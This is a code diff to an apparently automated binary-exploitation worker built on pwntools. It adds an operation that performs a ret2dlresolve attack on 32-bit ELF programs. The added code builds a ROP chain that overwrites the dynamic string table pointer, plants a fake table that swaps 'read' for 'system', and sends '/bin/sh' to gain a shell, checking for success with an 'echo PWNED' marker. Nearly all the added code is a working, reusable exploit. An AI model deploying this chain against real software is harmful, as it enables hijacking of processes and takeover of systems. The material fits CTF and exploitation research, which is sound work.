@@ -44,8 +44,13 @@ def _elf(path: str):
     key = (path, stat.st_mtime, stat.st_size)
     cached = _CACHE.get(key)
     if cached is None:
+        from pwn import context
+
         _CACHE.clear()
         cached = ELF(path, checksec=False)
+        # ROP 依赖全局 context.arch；worker 常驻，切二进制时必须同步
+        context.arch = "amd64" if cached.bits == 64 else "i386"
+        context.bits = cached.bits
         _CACHE[key] = cached
     return cached
 
@@ -272,6 +277,79 @@ def _handle(request: dict) -> dict:
         return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
     op = request.get("op")
     try:
+        if op == "dlresolve_strtab":
+            from pwn import ELF, ROP, context, p32
+
+            context.arch = "i386"
+            context.bits = 32
+
+            elf = _elf(request["path"])
+            if elf.bits != 32:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "only_i386_supported"}}
+            dynamic = elf.get_section_by_name(".dynamic")
+            dynstr = elf.get_section_by_name(".dynstr")
+            entry_addr = None
+            if dynamic is not None:
+                for index, tag in enumerate(dynamic.iter_tags()):
+                    if tag.entry.d_tag == "DT_STRTAB":
+                        entry_addr = dynamic.header.sh_addr + index * 8
+                        break
+            if entry_addr is None or dynstr is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "dynamic_missing"}}
+            original = dynstr.data()
+            if b"read\x00" not in original:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "read_symbol_missing"}}
+            fake = original.replace(b"read\x00", b"system\x00", 1)
+            fake_addr = elf.bss()
+            sh_addr = fake_addr + 0x100
+            read_plt = elf.plt.get("read")
+            if read_plt is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "read_plt_missing"}}
+            offsets = [int(value) for value in request["offsets"]]
+            started = time.perf_counter()
+            last_error = None
+            for offset in offsets:
+                try:
+                    rop = ROP(elf)
+                    rop.raw(b"a" * offset)
+                    rop.read(0, entry_addr + 4, 4)
+                    rop.read(0, fake_addr, len(fake))
+                    rop.read(0, sh_addr, 8)
+                    rop.raw(read_plt + 6)
+                    rop.raw(0xDEADBEEF)
+                    rop.raw(sh_addr)
+                    chain = rop.chain()
+                    if len(chain) > 0x100:
+                        return {"ok": True, "data": {
+                            "solved": False, "error": "chain_too_long",
+                            "chain_len": len(chain)}}
+                    io = process(elf.path)
+                    io.send(chain.ljust(0x100, b"a"))
+                    time.sleep(0.05)
+                    io.send(p32(fake_addr))
+                    time.sleep(0.05)
+                    io.send(fake)
+                    time.sleep(0.05)
+                    io.send(b"/bin/sh\x00")
+                    time.sleep(0.2)
+                    io.send(b"echo PWNED; exit\n")
+                    output = io.recvrepeat(1.5) or b""
+                    io.close()
+                    if b"PWNED" in output:
+                        return {"ok": True, "data": {
+                            "solved": True, "offset": offset,
+                            "fake_addr": fake_addr, "chain_len": len(chain),
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception as error:  # noqa: BLE001
+                    last_error = f"{type(error).__name__}:{error}"[:120]
+                    continue
+            return {"ok": True, "data": {"solved": False,
+                                         "error": last_error or "payload_failed",
+                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
         if op == "partial_overwrite":
             path = request["path"]
             offset = int(request["offset"])
